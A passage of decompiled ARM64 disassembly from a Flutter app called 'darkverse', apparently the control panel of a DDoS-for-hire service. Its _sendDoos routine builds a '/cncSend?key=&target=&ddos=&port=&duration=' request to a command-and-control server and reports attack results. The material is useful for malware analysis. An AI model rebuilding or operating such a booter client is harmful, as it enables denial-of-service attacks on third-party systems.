    //     0x806028: bl              #0x806040  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_sendDoos
    // 0x80602c: LeaveFrame
    //     0x80602c: mov             SP, fp
    //     0x806030: ldp             fp, lr, [SP], #0x10
    // 0x806034: ret
    //     0x806034: ret             
    // 0x806038: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x806038: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x80603c: b               #0x806028
  }
  _ _sendDoos(/* No info */) async {
    // ** addr: 0x806040, size: 0x450
    // 0x806040: EnterFrame
    //     0x806040: stp             fp, lr, [SP, #-0x10]!
    //     0x806044: mov             fp, SP
    // 0x806048: AllocStack(0xd0)
    //     0x806048: sub             SP, SP, #0xd0
    // 0x80604c: SetupParameters(_AttackPanelState this /* r1 => r1, fp-0x90 */)
    //     0x80604c: stur            NULL, [fp, #-8]
    //     0x806050: stur            x1, [fp, #-0x90]
    // 0x806054: CheckStackOverflow
    //     0x806054: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x806058: cmp             SP, x16
    //     0x80605c: b.ls            #0x806454
    // 0x806060: InitAsync() -> Future<void?>
    //     0x806060: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x806064: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x806068: ldur            x0, [fp, #-0x90]
    // 0x80606c: LoadField: r1 = r0->field_1b
    //     0x80606c: ldur            w1, [x0, #0x1b]
    // 0x806070: DecompressPointer r1
    //     0x806070: add             x1, x1, HEAP, lsl #32
    // 0x806074: LoadField: r2 = r1->field_27
    //     0x806074: ldur            w2, [x1, #0x27]
    // 0x806078: DecompressPointer r2
    //     0x806078: add             x2, x2, HEAP, lsl #32
    // 0x80607c: LoadField: r1 = r2->field_7
    //     0x80607c: ldur            w1, [x2, #7]
    // 0x806080: DecompressPointer r1
    //     0x806080: add             x1, x1, HEAP, lsl #32
    // 0x806084: r0 = trim()
    //     0x806084: bl              #0x49a758  ; [dart:core] _StringBase::trim
    // 0x806088: mov             x2, x0
    // 0x80608c: ldur            x0, [fp, #-0x90]
    // 0x806090: stur            x2, [fp, #-0x98]
    // 0x806094: LoadField: r1 = r0->field_1f
    //     0x806094: ldur            w1, [x0, #0x1f]
    // 0x806098: DecompressPointer r1
    //     0x806098: add             x1, x1, HEAP, lsl #32
    // 0x80609c: LoadField: r3 = r1->field_27
    //     0x80609c: ldur            w3, [x1, #0x27]
    // 0x8060a0: DecompressPointer r3
    //     0x8060a0: add             x3, x3, HEAP, lsl #32
    // 0x8060a4: LoadField: r1 = r3->field_7
    //     0x8060a4: ldur            w1, [x3, #7]
    // 0x8060a8: DecompressPointer r1
    //     0x8060a8: add             x1, x1, HEAP, lsl #32
    // 0x8060ac: r0 = trim()
    //     0x8060ac: bl              #0x49a758  ; [dart:core] _StringBase::trim
    // 0x8060b0: mov             x2, x0
    // 0x8060b4: ldur            x1, [fp, #-0x90]
    // 0x8060b8: stur            x2, [fp, #-0xb0]
    // 0x8060bc: LoadField: r0 = r1->field_b
    //     0x8060bc: ldur            w0, [x1, #0xb]
    // 0x8060c0: DecompressPointer r0
    //     0x8060c0: add             x0, x0, HEAP, lsl #32
    // 0x8060c4: cmp             w0, NULL
    // 0x8060c8: b.eq            #0x80645c
    // 0x8060cc: LoadField: r3 = r0->field_b
    //     0x8060cc: ldur            w3, [x0, #0xb]
    // 0x8060d0: DecompressPointer r3
    //     0x8060d0: add             x3, x3, HEAP, lsl #32
    // 0x8060d4: stur            x3, [fp, #-0xa8]
    // 0x8060d8: LoadField: d0 = r1->field_2f
    //     0x8060d8: ldur            d0, [x1, #0x2f]
    // 0x8060dc: fcmp            d0, d0
    // 0x8060e0: b.vs            #0x806460
    // 0x8060e4: fcvtzs          x4, d0
    // 0x8060e8: asr             x16, x4, #0x1e
    // 0x8060ec: cmp             x16, x4, asr #63
    // 0x8060f0: b.ne            #0x806460
    // 0x8060f4: lsl             x4, x4, #1
    // 0x8060f8: ldur            x5, [fp, #-0x98]
    // 0x8060fc: stur            x4, [fp, #-0xa0]
    // 0x806100: LoadField: r0 = r5->field_7
    //     0x806100: ldur            w0, [x5, #7]
    // 0x806104: cbz             w0, #0x806110
    // 0x806108: LoadField: r0 = r3->field_7
    //     0x806108: ldur            w0, [x3, #7]
    // 0x80610c: cbnz            w0, #0x80612c
    // 0x806110: r2 = "❌ Invalid Input"
    //     0x806110: add             x2, PP, #0x40, lsl #12  ; [pp+0x40f90] "❌ Invalid Input"
    //     0x806114: ldr             x2, [x2, #0xf90]
    // 0x806118: r3 = "Target IP cannot be empty."
    //     0x806118: add             x3, PP, #0x40, lsl #12  ; [pp+0x40f98] "Target IP cannot be empty."
    //     0x80611c: ldr             x3, [x3, #0xf98]
    // 0x806120: r0 = _showAlert()
    //     0x806120: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x806124: r0 = Null
    //     0x806124: mov             x0, NULL
    // 0x806128: r0 = ReturnAsyncNotFuture()
    //     0x806128: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x80612c: LoadField: r0 = r1->field_2b
    //     0x80612c: ldur            w0, [x1, #0x2b]
    // 0x806130: DecompressPointer r0
    //     0x806130: add             x0, x0, HEAP, lsl #32
    // 0x806134: r6 = LoadClassIdInstr(r0)
    //     0x806134: ldur            x6, [x0, #-1]
    //     0x806138: ubfx            x6, x6, #0xc, #0x14
    // 0x80613c: r16 = "icmp"
    //     0x80613c: add             x16, PP, #0x3e, lsl #12  ; [pp+0x3e968] "icmp"
    //     0x806140: ldr             x16, [x16, #0x968]
    // 0x806144: stp             x16, x0, [SP]
    // 0x806148: mov             x0, x6
    // 0x80614c: mov             lr, x0
    // 0x806150: ldr             lr, [x21, lr, lsl #3]
    // 0x806154: blr             lr
    // 0x806158: tbz             w0, #4, #0x80619c
    // 0x80615c: ldur            x0, [fp, #-0xb0]
    // 0x806160: LoadField: r1 = r0->field_7
    //     0x806160: ldur            w1, [x0, #7]
    // 0x806164: cbz             w1, #0x80617c
    // 0x806168: mov             x1, x0
    // 0x80616c: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x80616c: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x806170: r0 = tryParse()
    //     0x806170: bl              #0x481aa0  ; [dart:core] int::tryParse
    // 0x806174: cmp             w0, NULL
    // 0x806178: b.ne            #0x80619c
    // 0x80617c: ldur            x1, [fp, #-0x90]
    // 0x806180: r2 = "❌ Invalid Port"
    //     0x806180: add             x2, PP, #0x40, lsl #12  ; [pp+0x40fa0] "❌ Invalid Port"
    //     0x806184: ldr             x2, [x2, #0xfa0]
    // 0x806188: r3 = "Please input a valid port."
    //     0x806188: add             x3, PP, #0x40, lsl #12  ; [pp+0x40fa8] "Please input a valid port."
    //     0x80618c: ldr             x3, [x3, #0xfa8]
    // 0x806190: r0 = _showAlert()
    //     0x806190: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x806194: r0 = Null
    //     0x806194: mov             x0, NULL
    // 0x806198: r0 = ReturnAsyncNotFuture()
    //     0x806198: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x80619c: ldur            x3, [fp, #-0x90]
    // 0x8061a0: ldur            x5, [fp, #-0x98]
    // 0x8061a4: ldur            x0, [fp, #-0xb0]
    // 0x8061a8: ldur            x4, [fp, #-0xa8]
    // 0x8061ac: r1 = Null
    //     0x8061ac: mov             x1, NULL
    // 0x8061b0: r2 = 22
    //     0x8061b0: mov             x2, #0x16
    // 0x8061b4: r0 = AllocateArray()
    //     0x8061b4: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x8061b8: ldur            x1, [fp, #-0x90]
    // 0x8061bc: LoadField: r2 = r1->field_23
    //     0x8061bc: ldur            w2, [x1, #0x23]
    // 0x8061c0: DecompressPointer r2
    //     0x8061c0: add             x2, x2, HEAP, lsl #32
    // 0x8061c4: StoreField: r0->field_f = r2
    //     0x8061c4: stur            w2, [x0, #0xf]
    // 0x8061c8: r16 = "/cncSend\?key="
    //     0x8061c8: add             x16, PP, #0x40, lsl #12  ; [pp+0x40fb0] "/cncSend\?key="
    //     0x8061cc: ldr             x16, [x16, #0xfb0]
    // 0x8061d0: StoreField: r0->field_13 = r16
    //     0x8061d0: stur            w16, [x0, #0x13]
    // 0x8061d4: ldur            x2, [fp, #-0xa8]
    // 0x8061d8: ArrayStore: r0[0] = r2  ; List_4
    //     0x8061d8: stur            w2, [x0, #0x17]
    // 0x8061dc: r16 = "&target="
    //     0x8061dc: add             x16, PP, #0x14, lsl #12  ; [pp+0x142e8] "&target="
    //     0x8061e0: ldr             x16, [x16, #0x2e8]
    // 0x8061e4: StoreField: r0->field_1b = r16
    //     0x8061e4: stur            w16, [x0, #0x1b]
    // 0x8061e8: ldur            x2, [fp, #-0x98]
    // 0x8061ec: StoreField: r0->field_1f = r2
    //     0x8061ec: stur            w2, [x0, #0x1f]
    // 0x8061f0: r16 = "&ddos="
    //     0x8061f0: add             x16, PP, #0x40, lsl #12  ; [pp+0x40fb8] "&ddos="
    //     0x8061f4: ldr             x16, [x16, #0xfb8]
    // 0x8061f8: StoreField: r0->field_23 = r16
    //     0x8061f8: stur            w16, [x0, #0x23]
    // 0x8061fc: LoadField: r3 = r1->field_2b
    //     0x8061fc: ldur            w3, [x1, #0x2b]
    // 0x806200: DecompressPointer r3
    //     0x806200: add             x3, x3, HEAP, lsl #32
    // 0x806204: StoreField: r0->field_27 = r3
    //     0x806204: stur            w3, [x0, #0x27]
    // 0x806208: r16 = "&port="
    //     0x806208: add             x16, PP, #0x40, lsl #12  ; [pp+0x40fc0] "&port="
    //     0x80620c: ldr             x16, [x16, #0xfc0]
    // 0x806210: StoreField: r0->field_2b = r16
    //     0x806210: stur            w16, [x0, #0x2b]
    // 0x806214: ldur            x3, [fp, #-0xb0]
    // 0x806218: LoadField: r4 = r3->field_7
    //     0x806218: ldur            w4, [x3, #7]
    // 0x80621c: cbnz            w4, #0x806228
    // 0x806220: r4 = 0
    //     0x806220: mov             x4, #0
    // 0x806224: b               #0x80622c
    // 0x806228: mov             x4, x3
    // 0x80622c: ldur            x3, [fp, #-0xa0]
    // 0x806230: stur            x4, [fp, #-0xa8]
    // 0x806234: StoreField: r0->field_2f = r4
    //     0x806234: stur            w4, [x0, #0x2f]
    // 0x806238: r16 = "&duration="
    //     0x806238: add             x16, PP, #0x40, lsl #12  ; [pp+0x40fc8] "&duration="
    //     0x80623c: ldr             x16, [x16, #0xfc8]
    // 0x806240: StoreField: r0->field_33 = r16
    //     0x806240: stur            w16, [x0, #0x33]
    // 0x806244: StoreField: r0->field_37 = r3
    //     0x806244: stur            w3, [x0, #0x37]
    // 0x806248: str             x0, [SP]
    // 0x80624c: r0 = _interpolate()
    //     0x80624c: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x806250: mov             x1, x0
    // 0x806254: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x806254: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x806258: r0 = parse()
    //     0x806258: bl              #0x4a4d3c  ; [dart:core] Uri::parse
    // 0x80625c: mov             x1, x0
    // 0x806260: stur            x0, [fp, #-0xb0]
    // 0x806264: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x806264: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x806268: r0 = get()
    //     0x806268: bl              #0x6a13f8  ; [package:http/http.dart] ::get
    // 0x80626c: mov             x1, x0
    // 0x806270: stur            x1, [fp, #-0xb8]
    // 0x806274: r0 = Await()
    //     0x806274: bl              #0x4a3d90  ; AwaitStub
    // 0x806278: mov             x1, x0
    // 0x80627c: stur            x0, [fp, #-0xb8]
    // 0x806280: r0 = body()
    //     0x806280: bl              #0x4789e4  ; [package:http/src/response.dart] Response::body
    // 0x806284: mov             x1, x0
    // 0x806288: r0 = jsonDecode()
    //     0x806288: bl              #0x4789a4  ; [dart:convert] ::jsonDecode
    // 0x80628c: mov             x1, x0
    // 0x806290: stur            x0, [fp, #-0xc0]
    // 0x806294: r0 = print()
    //     0x806294: bl              #0x4bbd08  ; [dart:core] ::print
    // 0x806298: ldur            x16, [fp, #-0xc0]
    // 0x80629c: r30 = "cooldown"
    //     0x80629c: add             lr, PP, #0x14, lsl #12  ; [pp+0x143b8] "cooldown"
    //     0x8062a0: ldr             lr, [lr, #0x3b8]
    // 0x8062a4: stp             lr, x16, [SP]
    // 0x8062a8: r4 = 0
    //     0x8062a8: mov             x4, #0
    // 0x8062ac: ldr             x0, [SP, #8]
    // 0x8062b0: r16 = 505515453348
    //     0x8062b0: add             x16, PP, #0x40, lsl #12  ; [pp+0x40fd0] IMM: 0x75b311aba4
    //     0x8062b4: add             x16, x16, #0xfd0
    // 0x8062b8: ldp             lr, x5, [x16]
    // 0x8062bc: blr             lr
    // 0x8062c0: r1 = 60
    //     0x8062c0: mov             x1, #0x3c
    // 0x8062c4: branchIfSmi(r0, 0x8062d0)
    //     0x8062c4: tbz             w0, #0, #0x8062d0
    // 0x8062c8: r1 = LoadClassIdInstr(r0)
    //     0x8062c8: ldur            x1, [x0, #-1]
    //     0x8062cc: ubfx            x1, x1, #0xc, #0x14
    // 0x8062d0: r16 = true
    //     0x8062d0: add             x16, NULL, #0x20  ; true
    // 0x8062d4: stp             x16, x0, [SP]
    // 0x8062d8: mov             x0, x1
    // 0x8062dc: mov             lr, x0
    // 0x8062e0: ldr             lr, [x21, lr, lsl #3]
    // 0x8062e4: blr             lr
    // 0x8062e8: tbnz            w0, #4, #0x806308
    // 0x8062ec: ldur            x1, [fp, #-0x90]
    // 0x8062f0: r2 = "⏳ Cooldown"
    //     0x8062f0: add             x2, PP, #0x40, lsl #12  ; [pp+0x40fe0] "⏳ Cooldown"
    //     0x8062f4: ldr             x2, [x2, #0xfe0]
    // 0x8062f8: r3 = "Please wait a moment before sending again."
    //     0x8062f8: add             x3, PP, #0x40, lsl #12  ; [pp+0x40fe8] "Please wait a moment before sending again."
    //     0x8062fc: ldr             x3, [x3, #0xfe8]
    // 0x806300: r0 = _showAlert()
    //     0x806300: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x806304: b               #0x80644c
    // 0x806308: ldur            x16, [fp, #-0xc0]
    // 0x80630c: r30 = "valid"
    //     0x80630c: add             lr, PP, #0xf, lsl #12  ; [pp+0xfb48] "valid"
    //     0x806310: ldr             lr, [lr, #0xb48]
    // 0x806314: stp             lr, x16, [SP]
    // 0x806318: r4 = 0
    //     0x806318: mov             x4, #0
    // 0x80631c: ldr             x0, [SP, #8]
    // 0x806320: r16 = 505515453348
    //     0x806320: add             x16, PP, #0x40, lsl #12  ; [pp+0x40ff0] IMM: 0x75b311aba4
    //     0x806324: add             x16, x16, #0xff0
    // 0x806328: ldp             lr, x5, [x16]
    // 0x80632c: blr             lr
    // 0x806330: r1 = 60
    //     0x806330: mov             x1, #0x3c
    // 0x806334: branchIfSmi(r0, 0x806340)
    //     0x806334: tbz             w0, #0, #0x806340
    // 0x806338: r1 = LoadClassIdInstr(r0)
    //     0x806338: ldur            x1, [x0, #-1]
    //     0x80633c: ubfx            x1, x1, #0xc, #0x14
    // 0x806340: r16 = false
    //     0x806340: add             x16, NULL, #0x30  ; false
    // 0x806344: stp             x16, x0, [SP]
    // 0x806348: mov             x0, x1
    // 0x80634c: mov             lr, x0
    // 0x806350: ldr             lr, [x21, lr, lsl #3]
    // 0x806354: blr             lr
    // 0x806358: tbnz            w0, #4, #0x806378
    // 0x80635c: ldur            x1, [fp, #-0x90]
    // 0x806360: r2 = "❌ Invalid Key"
    //     0x806360: add             x2, PP, #0x41, lsl #12  ; [pp+0x41000] "❌ Invalid Key"
    //     0x806364: ldr             x2, [x2]
    // 0x806368: r3 = "Your session key is invalid. Please log in again."
    //     0x806368: add             x3, PP, #0x41, lsl #12  ; [pp+0x41008] "Your session key is invalid. Please log in again."
    //     0x80636c: ldr             x3, [x3, #8]
    // 0x806370: r0 = _showAlert()
    //     0x806370: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x806374: b               #0x80644c
    // 0x806378: ldur            x16, [fp, #-0xc0]
    // 0x80637c: r30 = "sended"
    //     0x80637c: add             lr, PP, #0x14, lsl #12  ; [pp+0x14428] "sended"
    //     0x806380: ldr             lr, [lr, #0x428]
    // 0x806384: stp             lr, x16, [SP]
    // 0x806388: r4 = 0
    //     0x806388: mov             x4, #0
    // 0x80638c: ldr             x0, [SP, #8]
    // 0x806390: r30 = 505515453348
    //     0x806390: add             x16, PP, #0x41, lsl #12  ; [pp+0x41010] IMM: 0x75b311aba4
    //     0x806394: ldp             lr, x5, [x16, #0x10]
    // 0x806398: blr             lr
    // 0x80639c: r1 = 60
    //     0x80639c: mov             x1, #0x3c
    // 0x8063a0: branchIfSmi(r0, 0x8063ac)
    //     0x8063a0: tbz             w0, #0, #0x8063ac
    // 0x8063a4: r1 = LoadClassIdInstr(r0)
    //     0x8063a4: ldur            x1, [x0, #-1]
    //     0x8063a8: ubfx            x1, x1, #0xc, #0x14
    // 0x8063ac: r16 = false
    //     0x8063ac: add             x16, NULL, #0x30  ; false
    // 0x8063b0: stp             x16, x0, [SP]
    // 0x8063b4: mov             x0, x1
    // 0x8063b8: mov             lr, x0
    // 0x8063bc: ldr             lr, [x21, lr, lsl #3]
    // 0x8063c0: blr             lr
    // 0x8063c4: tbnz            w0, #4, #0x8063e4
    // 0x8063c8: ldur            x1, [fp, #-0x90]
    // 0x8063cc: r2 = "⚠️ Failed"
    //     0x8063cc: add             x2, PP, #0x41, lsl #12  ; [pp+0x41020] "⚠️ Failed"
    //     0x8063d0: ldr             x2, [x2, #0x20]
    // 0x8063d4: r3 = "Failed to send attack. The server may be under maintenance."
    //     0x8063d4: add             x3, PP, #0x41, lsl #12  ; [pp+0x41028] "Failed to send attack. The server may be under maintenance."
    //     0x8063d8: ldr             x3, [x3, #0x28]
    // 0x8063dc: r0 = _showAlert()
    //     0x8063dc: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x8063e0: b               #0x80644c
    // 0x8063e4: ldur            x0, [fp, #-0x98]
    // 0x8063e8: r1 = Null
    //     0x8063e8: mov             x1, NULL
    // 0x8063ec: r2 = 6
    //     0x8063ec: mov             x2, #6
    // 0x8063f0: r0 = AllocateArray()
    //     0x8063f0: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x8063f4: r16 = "Attack has been successfully sent to "
    //     0x8063f4: add             x16, PP, #0x41, lsl #12  ; [pp+0x41030] "Attack has been successfully sent to "
    //     0x8063f8: ldr             x16, [x16, #0x30]
    // 0x8063fc: StoreField: r0->field_f = r16
    //     0x8063fc: stur            w16, [x0, #0xf]
    // 0x806400: ldur            x1, [fp, #-0x98]
    // 0x806404: StoreField: r0->field_13 = r1
    //     0x806404: stur            w1, [x0, #0x13]
    // 0x806408: r16 = "."
    //     0x806408: ldr             x16, [PP, #0x150]  ; [pp+0x150] "."
    // 0x80640c: ArrayStore: r0[0] = r16  ; List_4
    //     0x80640c: stur            w16, [x0, #0x17]
    // 0x806410: str             x0, [SP]
    // 0x806414: r0 = _interpolate()
    //     0x806414: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x806418: ldur            x1, [fp, #-0x90]
    // 0x80641c: mov             x3, x0
    // 0x806420: r2 = "✅ Success"
    //     0x806420: add             x2, PP, #0x41, lsl #12  ; [pp+0x41038] "✅ Success"
    //     0x806424: ldr             x2, [x2, #0x38]
    // 0x806428: r0 = _showAlert()
    //     0x806428: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x80642c: b               #0x80644c
    // 0x806430: sub             SP, fp, #0xd0
    // 0x806434: ldur            x1, [fp, #-0x90]
    // 0x806438: r2 = "❌ Error"
    //     0x806438: add             x2, PP, #0x37, lsl #12  ; [pp+0x37408] "❌ Error"
    //     0x80643c: ldr             x2, [x2, #0x408]
    // 0x806440: r3 = "An unexpected error occurred. Please try again."
    //     0x806440: add             x3, PP, #0x41, lsl #12  ; [pp+0x41040] "An unexpected error occurred. Please try again."
    //     0x806444: ldr             x3, [x3, #0x40]
    // 0x806448: r0 = _showAlert()
    //     0x806448: bl              #0x806490  ; [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert
    // 0x80644c: r0 = Null
    //     0x80644c: mov             x0, NULL
    // 0x806450: r0 = ReturnAsyncNotFuture()
    //     0x806450: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x806454: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x806454: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x806458: b               #0x806060
    // 0x80645c: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x80645c: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
    // 0x806460: SaveReg d0
    //     0x806460: str             q0, [SP, #-0x10]!
    // 0x806464: stp             x2, x3, [SP, #-0x10]!
    // 0x806468: SaveReg r1
    //     0x806468: str             x1, [SP, #-8]!
    // 0x80646c: r0 = 76
    //     0x80646c: mov             x0, #0x4c
    // 0x806470: r30 = DoubleToIntegerStub
    //     0x806470: ldr             lr, [PP, #0x1590]  ; [pp+0x1590] Stub: DoubleToInteger (0x451890)
    // 0x806474: LoadField: r30 = r30->field_7
    //     0x806474: ldur            lr, [lr, #7]
    // 0x806478: blr             lr
    // 0x80647c: mov             x4, x0
    // 0x806480: RestoreReg r1
    //     0x806480: ldr             x1, [SP], #8
    // 0x806484: ldp             x2, x3, [SP], #0x10
    // 0x806488: RestoreReg d0
    //     0x806488: ldr             q0, [SP], #0x10
    // 0x80648c: b               #0x8060f8
  }
  _ _showAlert(/* No info */) {
    // ** addr: 0x806490, size: 0x9c
    // 0x806490: EnterFrame
    //     0x806490: stp             fp, lr, [SP, #-0x10]!
    //     0x806494: mov             fp, SP
    // 0x806498: AllocStack(0x30)
    //     0x806498: sub             SP, SP, #0x30
    // 0x80649c: SetupParameters(_AttackPanelState this /* r1 => r1, fp-0x8 */, dynamic _ /* r2 => r2, fp-0x10 */, dynamic _ /* r3 => r3, fp-0x18 */)
    //     0x80649c: stur            x1, [fp, #-8]
    //     0x8064a0: stur            x2, [fp, #-0x10]
    //     0x8064a4: stur            x3, [fp, #-0x18]
    // 0x8064a8: CheckStackOverflow
    //     0x8064a8: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x8064ac: cmp             SP, x16
    //     0x8064b0: b.ls            #0x806520
    // 0x8064b4: r1 = 3
    //     0x8064b4: mov             x1, #3
    // 0x8064b8: r0 = AllocateContext()
    //     0x8064b8: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x8064bc: mov             x1, x0
    // 0x8064c0: ldur            x0, [fp, #-8]
    // 0x8064c4: StoreField: r1->field_f = r0
    //     0x8064c4: stur            w0, [x1, #0xf]
    // 0x8064c8: ldur            x2, [fp, #-0x10]
    // 0x8064cc: StoreField: r1->field_13 = r2
    //     0x8064cc: stur            w2, [x1, #0x13]
    // 0x8064d0: ldur            x2, [fp, #-0x18]
    // 0x8064d4: ArrayStore: r1[0] = r2  ; List_4
    //     0x8064d4: stur            w2, [x1, #0x17]
    // 0x8064d8: LoadField: r3 = r0->field_f
    //     0x8064d8: ldur            w3, [x0, #0xf]
    // 0x8064dc: DecompressPointer r3
    //     0x8064dc: add             x3, x3, HEAP, lsl #32
    // 0x8064e0: stur            x3, [fp, #-0x10]
    // 0x8064e4: cmp             w3, NULL
    // 0x8064e8: b.eq            #0x806528
    // 0x8064ec: mov             x2, x1
    // 0x8064f0: r1 = Function '<anonymous closure>':.
    //     0x8064f0: add             x1, PP, #0x41, lsl #12  ; [pp+0x41048] AnonymousClosure: (0x80652c), in [package:darkverse/ddos_panel.dart] _AttackPanelState::_showAlert (0x806490)
    //     0x8064f4: ldr             x1, [x1, #0x48]
    // 0x8064f8: r0 = AllocateClosure()
    //     0x8064f8: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x8064fc: stp             x0, NULL, [SP, #8]
    // 0x806500: ldur            x16, [fp, #-0x10]
    // 0x806504: str             x16, [SP]
    // 0x806508: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x806508: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x80650c: r0 = showDialog()
    //     0x80650c: bl              #0x6af738  ; [package:flutter/src/material/dialog.dart] ::showDialog
    // 0x806510: r0 = Null
    //     0x806510: mov             x0, NULL
    // 0x806514: LeaveFrame
    //     0x806514: mov             SP, fp
    //     0x806518: ldp             fp, lr, [SP], #0x10
    // 0x80651c: ret
    //     0x80651c: ret             
    // 0x806520: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x806520: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x806524: b               #0x8064b4
    // 0x806528: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x806528: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
  }
  [closure] AlertDialog <anonymous closure>(dynamic, BuildContext) {
    // ** addr: 0x80652c, size: 0x28c
    // 0x80652c: EnterFrame
    //     0x80652c: stp             fp, lr, [SP, #-0x10]!
    //     0x806530: mov             fp, SP
    // 0x806534: AllocStack(0x30)
    //     0x806534: sub             SP, SP, #0x30
    // 0x806538: SetupParameters([dynamic _ /* r0 */])
    //     0x806538: ldr             x0, [fp, #0x18]
    //     0x80653c: ldur            w2, [x0, #0x17]
    //     0x806540: add             x2, x2, HEAP, lsl #32
    //     0x806544: stur            x2, [fp, #-8]
    // 0x806548: CheckStackOverflow
    //     0x806548: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x80654c: cmp             SP, x16
    //     0x806550: b.ls            #0x8067b0
    // 0x806554: r0 = Radius()
    //     0x806554: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x806558: d0 = 20.000000
    //     0x806558: fmov            d0, #20.00000000
    // 0x80655c: stur            x0, [fp, #-0x10]
    // 0x806560: StoreField: r0->field_7 = d0
    //     0x806560: stur            d0, [x0, #7]
    // 0x806564: StoreField: r0->field_f = d0
    //     0x806564: stur            d0, [x0, #0xf]
    // 0x806568: r0 = BorderRadius()
    //     0x806568: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x80656c: mov             x1, x0
    // 0x806570: ldur            x0, [fp, #-0x10]
    // 0x806574: stur            x1, [fp, #-0x18]
    // 0x806578: StoreField: r1->field_7 = r0
    //     0x806578: stur            w0, [x1, #7]
    // 0x80657c: StoreField: r1->field_b = r0
    //     0x80657c: stur            w0, [x1, #0xb]
    // 0x806580: StoreField: r1->field_f = r0
    //     0x806580: stur            w0, [x1, #0xf]
    // 0x806584: StoreField: r1->field_13 = r0
    //     0x806584: stur            w0, [x1, #0x13]
    // 0x806588: r0 = BorderSide()
    //     0x806588: bl              #0x58d2d4  ; AllocateBorderSideStub -> BorderSide (size=0x20)
    // 0x80658c: mov             x1, x0
    // 0x806590: r0 = Instance_Color
    //     0x806590: add             x0, PP, #0x32, lsl #12  ; [pp+0x32f80] Obj!Color@a114c1
    //     0x806594: ldr             x0, [x0, #0xf80]
    // 0x806598: stur            x1, [fp, #-0x10]
    // 0x80659c: StoreField: r1->field_7 = r0
    //     0x80659c: stur            w0, [x1, #7]
    // 0x8065a0: d0 = 1.000000
    //     0x8065a0: fmov            d0, #1.00000000
    // 0x8065a4: StoreField: r1->field_b = d0
    //     0x8065a4: stur            d0, [x1, #0xb]
    // 0x8065a8: r2 = Instance_BorderStyle
    //     0x8065a8: add             x2, PP, #0xc, lsl #12  ; [pp+0xce40] Obj!BorderStyle@a406e1
    //     0x8065ac: ldr             x2, [x2, #0xe40]
    // 0x8065b0: StoreField: r1->field_13 = r2
    //     0x8065b0: stur            w2, [x1, #0x13]
    // 0x8065b4: d0 = -1.000000
    //     0x8065b4: fmov            d0, #-1.00000000
    // 0x8065b8: ArrayStore: r1[0] = d0  ; List_8
    //     0x8065b8: stur            d0, [x1, #0x17]
    // 0x8065bc: r0 = RoundedRectangleBorder()
    //     0x8065bc: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x8065c0: mov             x1, x0
    // 0x8065c4: ldur            x0, [fp, #-0x18]
    // 0x8065c8: stur            x1, [fp, #-0x20]
    // 0x8065cc: StoreField: r1->field_b = r0
    //     0x8065cc: stur            w0, [x1, #0xb]
    // 0x8065d0: ldur            x0, [fp, #-0x10]
    // 0x8065d4: StoreField: r1->field_7 = r0
    //     0x8065d4: stur            w0, [x1, #7]
    // 0x8065d8: ldur            x2, [fp, #-8]
    // 0x8065dc: LoadField: r0 = r2->field_13
    //     0x8065dc: ldur            w0, [x2, #0x13]
    // 0x8065e0: DecompressPointer r0
    //     0x8065e0: add             x0, x0, HEAP, lsl #32
    // 0x8065e4: stur            x0, [fp, #-0x18]
    // 0x8065e8: LoadField: r3 = r2->field_f
    //     0x8065e8: ldur            w3, [x2, #0xf]
    // 0x8065ec: DecompressPointer r3
    //     0x8065ec: add             x3, x3, HEAP, lsl #32
    // 0x8065f0: LoadField: r4 = r3->field_3b
    //     0x8065f0: ldur            w4, [x3, #0x3b]
    // 0x8065f4: DecompressPointer r4
    //     0x8065f4: add             x4, x4, HEAP, lsl #32
